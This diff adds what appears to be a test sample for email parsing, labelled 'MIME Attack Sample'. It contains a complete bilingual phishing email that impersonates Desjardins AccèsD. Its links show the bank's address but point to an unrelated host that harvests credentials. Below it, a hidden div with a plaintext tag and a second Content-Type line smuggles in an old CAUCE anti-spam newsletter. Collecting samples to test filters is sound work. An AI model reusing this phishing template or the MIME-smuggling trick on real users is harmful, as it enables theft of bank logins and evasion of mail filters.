@@ -1,0 +1,270 @@
+From: kislince@er.oge.com
+To: craig.buehler@enron.com, michelle.lokay@enron.com, maria.pavlou@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1HcQcp-0006Xh-Nf@server.fastbox.info>
+Date: Fri, 13 Apr 2007 13:35:59 -0500
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server.fastbox.info
+X-AntiAbuse: Original Domain - speedy.uwaterloo.ca
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - server.fastbox.info
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+Status: O
+Content-Length: 5798
+Lines: 104
+
+<html>
+
+<head>
+<title>Mouvement Desjardins</title>
+<style type="text/css">
+<!--
+.style1 {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 12px;
+}
+.style2 {
+	font-size: 14px;
+	font-weight: bold;
+}
+.style4 {font-size: 12px}
+-->
+</style>
+</head>
+<table width="777" border="0">
+  <tr>
+    <td width="17"> </td>
+    <td width="750"><TABLE width=750 border=1 align="right" cellPadding=0 cellSpacing=0 bordercolor="e1dcd0">
+      <TBODY>
+        <TR>
+          <TD width=750 bgcolor="efede6"><TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#009966 border=0>
+              <TBODY>
+                <TR>
+                  <TD><IMG 
+src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/bandeau.gif"></TD>
+                </TR>
+              </TBODY>
+            </TABLE>
+              <P align="justify"><SPAN class=Estilo6><span class="style2"><FONT color=#009966> Cher(e) membre 
+                Desjardins/ AccsD</FONT></span><FONT lang=0 face=Estilo size=2 
+PTSIZE="10" FAMILY="SANSSERIF"><BR>
+                  <BR>
+                  </FONT><FONT lang=0 
+PTSIZE="10" FAMILY="SANSSERIF"><span class="style1">Desjardins tient  vous signaler que votre dernire transaction n'a pas t automatiquement enregistr d  un nombre elev de transaction simultane. Le dpartement de vrification comptable du Groupe Desjardins  corriger le problme dans les comptes concerns. Si toutefois vous notez une diffrence, nous vous prions de nous en aviser. Si vous constatez une autre erreur, communiquez avec votre institution durant les heures de <a href="http://www.desjardins.com/fr/votre_caisse/index.jsp">votre caisse</a>.</span></FONT></SPAN>
+              <P align="justify"><span class="Estilo6"><font size=3 face="Estilo, Helvetica, sans-serif" class="style1">Pour accder  
+                votre compte et vrifier que tout soit normal, cliquez sur ce lien scuris si dessus :</font></span>
+              <P align="justify"><A 
+href="http://www.philsfeatheredfriends.com/sec/accesdesjardins/auportADPortail/ObtenirPageAccueil.doorigine_or/" target=_blank type=hidden><FONT 
+size=4>https://accesd.desjardins.com/</FONT></A>
+              <p class=style1>Soyez assur que Desjardins met tout en oeuvre pour protger les utilisateurs de ses services Internet </p>
+            <p class=Estilo6><font size=2 face="Arial, Helvetica, sans-serif" class="style1">Le Groupe 
+              Desjardins vous remercie de votre clientle et apprcie votre comprhension.</font></p>
+            <p class=Estilo6><STRONG><FONT face="Estilo, Helvetica, sans-serif" color=#009966 
+size=2>Desjardins / AccsD</FONT></STRONG><BR>
+                  <FONT size=2>Conjuguer avoirs et 
+                    tres 
+                </FONT></p>
+            <TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#009966 border=0>
+                <TBODY>
+                  <TR>
+                    <TD><IMG 
+src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/bandeau.gif"></TD>
+                  </TR>
+                </TBODY>
+              </TABLE>
+            <p><span class="style2"><FONT color=#009966>Dear Desjardins Member</FONT></span></p>
+            <P align="justify" class="style1">The Group Desjardins would like to inform you that your last transaction was not automatically recorded due to a high number of simultaneous transactions. Desjardins audit department corrected the problem in the accounts concerned. However if you notice a difference in your folio, we ask you to advise us by communicating with your institution during <a href="http://www.desjardins.com/fr/votre_caisse/index.jsp">opening hours</a>
+              <P align="justify"><span class="style1">We encourage you to    connect to your account and verify your transactions, by clicking the secured url below :<br>
+                    <BR>
+                </span><span class="style4"><A 
+href="http://www.philsfeatheredfriends.com/sec/accesdesjardins/auportADPortail/ObtenirPageAccueil.doorigine_or/" target=_blank type=hidden><FONT 
+size=4>https://accesd.desjardins.com/</FONT></A></span><span class="style1"> </span>
+              <P class=style1>Be assured that Desjardins makes every effort to protect our internet users </P>
+            <P class=style1>The Group Desjardins  thanks you for your business and appreciates your comprehension</P>
+            <P class=Estilo6><STRONG><FONT face="Estilo, Helvetica, sans-serif" color=#009966 
+size=2><br>
+              Desjardins / AccsD</FONT></STRONG><BR>
+              <FONT size=2>Money working for people </FONT></P>
+            <P><FONT face="Estilo, Helvetica,
+sans-serif" size=2><FONT color=#999999 
+size=1>Svp ne rpondez pas  ce courriel car c'est seulement un avis. Le courrier envoy  cette adresse ne peut pas tre rpondu. 
+              </FONT></FONT></P>
+            <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+                <TBODY>
+                  <TR>
+                    <TD width=5></TD>
+                    <TD class="footerText Estilo2" vAlign=bottom align=left><P class=style1>Copyright  2006 Mouvement des caisses Desjardins. Tous droits 
+                      rservs.</P></TD>
+                    <TD align=right><P><SPAN class=bodyText></FONT></SPAN> </P></TD>
+                  </TR>
+                  <TR>
+                    <TD width=5></TD>
+                    <TD class=Estilo5 colSpan=2></TD>
+                  </TR>
+                </TBODY>
+            </TABLE>
+            <P><FONT face="Estilo, Helvetica,
+sans-serif" size=2><FONT color=#999999 
+size=1></FONT></FONT><img src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/securite.gif" border="0" width="140" height="39"></P></TD>
+        </TR>
+      </TBODY>
+    </TABLE></td>
+  </tr>
+</table>
+</P>
+</body>
+
+</html>
+
+
+
+Content-Type: text/html
+<div style="display: none;"><plaintext>
+Content-Type: text/plain
+BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+			      CAUCE NEWS
+			  Volume 6, Number 2
+			      June, 2002
+
+In this issue:
+
+* Progress of Senate anti-spam bill
+* European Union bans spam
+
+IF YOU DON'T KNOW WHY YOU GOT THIS MESSAGE: Please see the
+"About This Message" section at the end.
+
+- --------------------------------------------------------------
+
+* Progress of Senate anti-spam bill
+
+Over a year ago, Sen. Conrad Burns (R-MT) introduced S.630, the CAN
+SPAM Act of 2001. This bill would require UCE to have a valid return
+address to facilitate consumers' removal from spam lists. It would
+place enforcement in the hands of the Federal Trade Commission, and
+state Attorneys General. It would also permit Internet Service
+Providers (ISPs) to enforce violations, up to $10 per illegal spam.
+It would preempt any stricter state anti-spam laws.
+
+The Senate Commerce Committee considered the bill on May 17th, and
+reported it out largely unchanged.  It's not now scheduled for further
+action in the Senate.
+
+CAUCE has always opposed this bill, since we believe it would lead to
+more spam, not less.  When South Korea passed a similar opt-out law
+last year, spam from Korea soon increased by a factor of 10.
+
+Our April 2001 press release goes into more detail about the problems
+with S.630:
+
+ http://www.cauce.org/pressreleases/pr-s630.shtml
+
+We're pleased that the Congress is looking at spam issues again, and
+hope that in the future we can help them create an effective bill that
+the entire Internet community can support.
+
+- --------------------------------------------------------------
+
+* European Union bans spam
+
+GLOBAL INTERNET COMMUNITY APPLAUDS EUROPEAN ANTI-SPAM VOTE
+
+May 31, 2002 - The Coalition Against Unsolicited Commercial E-Mail
+(CAUCE), EuroCAUCE, CAUCE India, CAUCE Canada and the Coalition Against
+Unsolicited Bulk E-Mail, Australia (CAUBE.au) today applauded the decision
+by the European Parliament to protect European Internet users from the
+practice of unsolicited e-mail advertisements. Yesterday's vote will turn
+Europe into a virtual "spam-free zone" after the formal adoption of the
+directive, making it illegal to send unsolicited e-mail, text message or
+other similar advertisements to individuals with whom companies do not
+have a preexisting business relationship.
+
+"This is a tremendous day for European Internet users," said EuroCAUCE
+Chairman George Mills. "We are extremely pleased that the European
+Parliament has listened to the citizens of its member countries and added
+the right to be left alone by spammers to its efforts to protect the
+privacy of Europeans."
+
+While six European Union member countries had already formalized "opt-in"
+in their national laws and regulations, yesterday's vote should turn all
+of Europe into a spam-free zone by the end of 2003.
+
+"Unfortunately, the rest of the world's Internet-using countries,
+including the United States, now lag behind Europe in their protection
+of Internet users," said CAUCE Chairman Scott Hazen Mueller. "This is
+a tremendous first step, but the rest of the world now needs to follow
+Europe's lead and unite behind protection of Internet users and
+network owners from abusive and costly unsolicited e-mail
+advertising."
+
+"This decision is the direct result of Internet users throughout the
+European Union standing up for their rights, and Members of the
+European Parliament listening to their constituents," said Mills. "Our
+members and our volunteers performed an integral part of this process,
+translating, lobbying and educating their representatives."
+
+More information on the E.U. directive is available on the European
+Parliament's Web site <http://www.europarl.eu.int/press/index_en.htm>,
+and a EuroCAUCE analysis is available at
+<http://www.euro.cauce.org/en/amendments1a.html>. More information on
+the international CAUCE network of affiliate organizations is
+available at <http://www.cauce.org>.
+
+- --------------------------------------------------------------
+
+About This Message:
+
+This message was written and broadcast by the Coalition Against
+Unsolicited Commercial E-Mail. It is copyrighted (c) 2002 by the
+Coalition Against Unsolicited Commercial E-Mail.
+
+We encourage redistribution of this message or items from it, as long
+as they are not spammed anywhere, are on-topic for any forum to which
+you send them, and include our copyright notice.  When in doubt, post
+the URL of our site (http://www.cauce.org) instead, or put it in your
+signature.  Press, broadcast, and Internet media may treat this
+material as they would a press release. For other commercial
+reproduction rights, contact John Levine <johnl@cauce.org>.
+
+*************************************************************************
+You have received this message because your address was signed up for
+the CAUCE-ANNOUNCE mailing list. If you do not want to receive any
+further messages from this list or think you were subscribed without
+your knowledge, please use the list's home page
+
+       http://lists.cauce.org/mailman/listinfo/cauce-announce
+
+or send mail to cauce-announce-request@cauce.org with a subject of
+"unsubscribe," or contact J.D. Falk <jdfalk@cauce.org> to be removed
+manually. We exist to eradicate unsolicited e-mail, and, unlike
+spammers, will honor "remove" requests.
+
+On the other hand, if a friend passed along this message to you and
+you would like to receive the CAUCE NEWS in the future, visit the
+CAUCE web site at http://www.cauce.org to join, or send a message to
+cauce-announce-request@cauce.org with a subject of "subscribe" if you
+want to subscribe without joining.
+*************************************************************************
+
+For other questions or comments about this message, contact John
+Levine <johnl@cauce.org>.
+
+Note to PGP users: your editor has a new longer key, which you'll need
+to verify the signature on this message.  It's available on the usual
+key servers.
+
+				 # #
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.0.6 (BSD/OS)
+Comment: For info see http://www.gnupg.org
+
+iEYEARECAAYFAjz+Ey4ACgkQkEiFRdeC/kWGPwCeLJwc5kU+dIWdYvZE4fr1DTRO
+HfEAnjuW22VH9mi1sPPtUuk+6yUpyABW
+=3DL1WX
+-----END PGP SIGNATURE-----
